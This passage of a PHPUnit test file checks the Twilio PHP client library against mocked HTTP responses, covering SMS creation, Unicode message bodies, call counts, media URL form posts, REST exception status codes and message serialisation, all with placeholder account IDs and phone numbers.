            ->with('/2010-04-01/Accounts/AC123/SMS/Messages.json', $this->formHeaders,
                'From=%2B14105551234&To=%2B14102221234&Body=bar')
            ->andReturn($this->nginxError);
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $message = $client->account->sms_messages->create('+14105551234',
            '+14102221234', 'bar');
    }

    function testExceptionUsesHttpStatus() {
        $http = $this->createMockHttp('/Queues/QU123/Members/Front', 'post',
            array(), array('Url' => 'http://google.com'), 400);
        $client = $this->getClient($http);
        try {
            $front = $client->account->queues->get('QU123')->members->front();
            $front->update(array('Url' => 'http://google.com'));
            $this->fail('should throw rest exception before reaching this line.');
        } catch (Services_Twilio_RestException $e) {
            $this->assertSame($e->getStatus(), 400);
            $this->assertSame($e->getMessage(), '');
        }
    }

    function testUnicode() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('post')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages.json', $this->formHeaders,
            'From=123&To=123&Body=Hello+%E2%98%BA')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('sid' => 'SM123'))
            )
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $message = $client->account->sms_messages->create('123', '123',
            'Hello ☺');
        $this->assertSame($message->sid, 'SM123');
    }

    function testCount() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls.json?Page=0&PageSize=1')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'total' => '1474',
                    'calls' => array(),
                ))
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $this->assertSame(count($client->account->calls), 1474);
    }

    function testCountNoTotal() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls.json?Page=0&PageSize=1')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'calls' => array(),
                ))
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $this->assertSame(count($client->account->calls), 0);
    }

    function testPostMultivaluedForm() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('post')->once()
            ->with('/2010-04-01/Accounts/AC123/Messages.json', $this->formHeaders,
            'From=123&To=123&MediaUrl=http%3A%2F%2Fexample.com%2Fimage1&MediaUrl=http%3A%2F%2Fexample.com%2Fimage2')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('sid' => 'SM123'))
            )
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $message = $client->account->messages->sendMessage('123', '123', null,
            array('http://example.com/image1', 'http://example.com/image2')
        );
        $this->assertSame($message->sid, 'SM123');
    }

    function testToString() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $resp = <<<JSON
            {
                "account_sid": "AC123",
                "api_version": "2010-04-01",
                "body": "Hello world!",
                "date_created": "Mon, 06 Jan 2014 04:54:34 +0000",
                "date_sent": "Mon, 06 Jan 2014 04:54:34 +0000",
                "date_updated": "Mon, 06 Jan 2014 04:54:34 +0000",
                "direction": "outbound-api",
                "from": "+19255556789",
                "num_media": null,
                "num_segments": "1",
                "price": "-0.00750",
                "price_unit": "USD",
                "sid": "SM77d5ccc71419444fb730541daaaaaaaa",
                "status": "sent",
                "subresource_uris": {
                    "media": "/2010-04-01/Accounts/AC123/Messages/SM77d5ccc71419444fb730541daaaaaaaa/Media.json"
                },
                "to": "+19255551234",
                "uri": "/2010-04-01/Accounts/AC123/Messages/SM77d5ccc71419444fb730541daaaaaaaa.json"
            }
JSON;
        $sampleMessage = new Services_Twilio_Rest_Message($http, '/foo',
            json_decode($resp)
        );
        $expected = '{"account_sid":"AC123","api_version":"2010-04-01","body":"Hello world!","date_created":"Mon, 06 Jan 2014 04:54:34 +0000","date_sent":"Mon, 06 Jan 2014 04:54:34 +0000","date_updated":"Mon, 06 Jan 2014 04:54:34 +0000","direction":"outbound-api","from":"+19255556789","num_media":null,"num_segments":"1","price":"-0.00750","price_unit":"USD","sid":"SM77d5ccc71419444fb730541daaaaaaaa","status":"sent","subresource_uris":{"media":"\/2010-04-01\/Accounts\/AC123\/Messages\/SM77d5ccc71419444fb730541daaaaaaaa\/Media.json"},"to":"+19255551234","uri":"\/foo"}';
        $this->assertSame((string)$sampleMessage, $expected);
    }

    function testSubresourceUris() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $call = new Services_Twilio_Rest_Call($http, '/foo');
        $recordings = $call->subresources['recordings'];
        $this->assertSame($recordings->uri, '/foo/Recordings');
    }
}
